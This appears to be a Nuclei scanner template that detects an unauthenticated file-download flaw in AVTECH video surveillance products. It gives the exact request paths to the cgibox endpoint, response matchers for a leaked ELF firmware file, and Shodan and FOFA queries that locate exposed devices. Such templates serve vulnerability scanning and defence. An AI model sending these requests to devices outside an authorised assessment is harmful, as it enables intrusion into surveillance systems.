id: avtech-unauth-file-download

info:
  name: AVTECH Video Surveillance Product - 未授权访问漏洞
  author: ritikchaddha
  severity: high
  description: AVTECH Video Surveillance Product - 未授权 File Download 存在未授权访问或认证绕过问题。攻击者无需有效凭证即可访问敏感接口、执行高权限操作或进一步扩大影响。
  metadata:
    verified: true
    max-request: 2
    shodan-query: title:"login" product:"Avtech"
    fofa-query: app="AVTECH-视频监控"
  tags: exposure,avtech,unauth,download,iot,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/cgibox?.cab"
      - "{{BaseURL}}/cgi-bin/cgibox?/nobody"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'ELF'
          - 'ddns_avtech_final'
        condition: and

      - type: word
        part: header
        words:
          - text/plain

      - type: status
        status:
          - 200
